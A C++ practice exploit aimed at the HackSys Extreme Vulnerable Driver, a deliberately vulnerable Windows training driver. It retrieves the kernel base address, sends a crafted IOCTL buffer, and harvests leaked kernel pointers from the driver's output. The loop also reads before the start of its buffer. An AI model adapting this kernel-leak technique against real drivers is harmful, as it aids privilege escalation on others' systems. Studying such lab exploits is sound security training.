#include <iostream>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>
#include <vector>
#include <ctime>


#pragma comment (lib,"psapi")

using namespace std;
uintptr_t getKernelBase() {
    const int bufferSize = 8; // Number of drivers we want to query
    std::vector<LPVOID> baseAddresses(bufferSize); // Buffer to store driver addresses
    DWORD bytesNeeded = 0;

    // Call EnumDeviceDrivers to retrieve the addresses of loaded device drivers
    if (!EnumDeviceDrivers(baseAddresses.data(), baseAddresses.size() * sizeof(LPVOID), &bytesNeeded)) {
        std::cerr << "Failed to get kernel base address." << std::endl;
        exit(EXIT_FAILURE);
    }

    // Return the first driver's base address (assumes it's the kernel's base)
    return reinterpret_cast<uintptr_t>(baseAddresses[0]);
}

int main()
{
    uintptr_t kernelBase = getKernelBase();
    std::cout << "Kernel base address: 0x" << std::hex << kernelBase << std::endl;

    getchar();
 
   HANDLE driver_handle = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (driver_handle == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while opening a handle to the driver: %d\n", GetLastError());
        return 0;
    }
    printf("[+] Successfully obtained the driver handle.\n");

    ULONG ioctl = 0x22203F;
    //ULONG ioctl = 0x22204B;

    ULONG driver_input_buffer_length = 80;
    char exploit[80 + 8];
    printf("[*] Preparing our exploit buffer\n");
    // Fill our exploit buffer with 'A'
    memset(exploit, 0x41, 80);

    ULONG driver_output_buffer_length = 2000;
    char output[2000];
    printf("[*] Preparing our exploit buffer\n");
    // Fill our exploit buffer with 'A'
    memset(output, 0x0, 10);

    getchar();

    LPDWORD lpBytesReturned = 0;
    if (!DeviceIoControl(driver_handle, ioctl, exploit, driver_input_buffer_length, output, driver_output_buffer_length, lpBytesReturned, NULL))
    {
        printf("[!] Error while calling DeviceIoControl\n");
    }

    std::vector<uint64_t> addresses;
    for (int i = 0; i < 2000; i++) {
        if ((unsigned char)output[i - 1] == 0xFF && (unsigned char)output[i] == 0xFF) {
            uint64_t address = 0;
            memcpy(&address, &output[i-7], sizeof(address));
            addresses.push_back(address);
            //std::cout << "Leaked pointer address: 0x" << std::hex << std::uppercase << address << std::endl;
        }
        printf("\\x%02X", (unsigned char)output[i]);
    }
    

    std::cout << "\nCaptured leak addresses:\n";
    for (const auto& addr : addresses) {
        std::cout << "0x" << std::hex << std::uppercase << addr << std::endl;
    }

   return 0;
}
